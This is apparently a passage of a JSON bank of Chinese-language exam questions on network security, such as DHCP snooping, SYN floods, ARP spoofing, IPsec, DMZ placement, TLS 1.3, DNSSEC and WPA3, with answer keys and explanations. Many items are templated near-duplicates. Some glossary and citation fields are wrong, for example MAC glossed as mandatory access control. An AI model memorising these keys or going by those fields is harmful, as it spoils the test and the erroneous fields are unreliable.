    "question": "某知名大型網路電商平台內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "B. 啟用 RIP 路由更新",
      "C. 開放所有交換器連接埠",
      "D. 關閉全網廣播封包"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-141",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Smurf ICMP 放大攻擊",
      "B. UDP Fraggle 攻擊",
      "C. Land 偽造攻擊",
      "D. TCP SYN Flood 阻斷服務攻擊"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-142",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 停用交換器生成樹協定（STP）",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 啟用巨型訊框（Jumbo Frame）",
      "D. 改用靜態路由協定 RIP"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-143",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 路由模式（Routed Mode）",
      "B. 橋接模式（Bridged Mode）",
      "C. 通道模式（Tunnel Mode）",
      "D. 傳輸模式（Transport Mode）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-144",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "B. 內部最核心機密資料庫網段（LAN）",
      "C. 網管專屬帶外管理網段（OOBM）",
      "D. 員工專用無線訪客網段"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-145",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. 會造成防火牆頻寬嚴重下降",
      "B. 資料庫無法回應 DMZ 的 TCP 請求",
      "C. DMZ 區不支援傳輸層協定",
      "D. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-146",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 廢除所有數位憑證驗證",
      "B. 取消所有非對稱加密交握",
      "C. 允許純文字明文傳輸以加快速度",
      "D. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-147",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. 靜態 HOSTS 檔案分發",
      "B. DNS 穿隧（DNS Tunneling）",
      "C. 動態 DNS（DDNS）",
      "D. DNSSEC（網域名稱安全延伸協定）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-148",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 22",
      "B. TCP 3389",
      "C. TCP 443",
      "D. TCP 80"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-149",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WPA3-Personal（採用 SAE 機制）",
      "B. WEP 128-bit",
      "C. 隱藏 SSID 廣播",
      "D. WPA2-Enterprise"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-150",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. 啟用 RIP 路由更新",
      "B. 關閉全網廣播封包",
      "C. 開放所有交換器連接埠",
      "D. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-151",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Smurf ICMP 放大攻擊",
      "B. TCP SYN Flood 阻斷服務攻擊",
      "C. UDP Fraggle 攻擊",
      "D. Land 偽造攻擊"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-152",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 改用靜態路由協定 RIP",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 啟用巨型訊框（Jumbo Frame）",
      "D. 停用交換器生成樹協定（STP）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-153",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 路由模式（Routed Mode）",
      "B. 傳輸模式（Transport Mode）",
      "C. 橋接模式（Bridged Mode）",
      "D. 通道模式（Tunnel Mode）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-154",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某區域教學醫學中心對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 內部最核心機密資料庫網段（LAN）",
      "B. 員工專用無線訪客網段",
      "C. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "D. 網管專屬帶外管理網段（OOBM）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-155",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. 會造成防火牆頻寬嚴重下降",
      "B. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "C. 資料庫無法回應 DMZ 的 TCP 請求",
      "D. DMZ 區不支援傳輸層協定"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-156",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "B. 廢除所有數位憑證驗證",
      "C. 取消所有非對稱加密交握",
      "D. 允許純文字明文傳輸以加快速度"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-157",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. DNS 穿隧（DNS Tunneling）",
      "B. DNSSEC（網域名稱安全延伸協定）",
      "C. 動態 DNS（DDNS）",
      "D. 靜態 HOSTS 檔案分發"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-158",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 22",
      "B. TCP 80",
      "C. TCP 443",
      "D. TCP 3389"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-159",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. 隱藏 SSID 廣播",
      "B. WPA3-Personal（採用 SAE 機制）",
      "C. WEP 128-bit",
      "D. WPA2-Enterprise"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-160",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. 開放所有交換器連接埠",
      "B. 關閉全網廣播封包",
      "C. 啟用 RIP 路由更新",
      "D. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-161",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Smurf ICMP 放大攻擊",
      "B. Land 偽造攻擊",
      "C. UDP Fraggle 攻擊",
      "D. TCP SYN Flood 阻斷服務攻擊"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-162",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 啟用巨型訊框（Jumbo Frame）",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 改用靜態路由協定 RIP",
      "D. 停用交換器生成樹協定（STP）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-163",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 通道模式（Tunnel Mode）",
      "B. 路由模式（Routed Mode）",
      "C. 橋接模式（Bridged Mode）",
      "D. 傳輸模式（Transport Mode）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-164",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 網管專屬帶外管理網段（OOBM）",
      "B. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "C. 員工專用無線訪客網段",
      "D. 內部最核心機密資料庫網段（LAN）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-165",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某區域教學醫學中心資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. 資料庫無法回應 DMZ 的 TCP 請求",
      "B. DMZ 區不支援傳輸層協定",
      "C. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "D. 會造成防火牆頻寬嚴重下降"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-166",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 允許純文字明文傳輸以加快速度",
      "B. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "C. 取消所有非對稱加密交握",
      "D. 廢除所有數位憑證驗證"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-167",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. DNS 穿隧（DNS Tunneling）",
      "B. 靜態 HOSTS 檔案分發",
      "C. DNSSEC（網域名稱安全延伸協定）",
      "D. 動態 DNS（DDNS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-168",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 22",
      "B. TCP 80",
      "C. TCP 443",
      "D. TCP 3389"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-169",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WPA3-Personal（採用 SAE 機制）",
      "B. WPA2-Enterprise",
      "C. WEP 128-bit",
      "D. 隱藏 SSID 廣播"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-170",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. 啟用 RIP 路由更新",
      "B. 開放所有交換器連接埠",
      "C. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "D. 關閉全網廣播封包"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-171",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
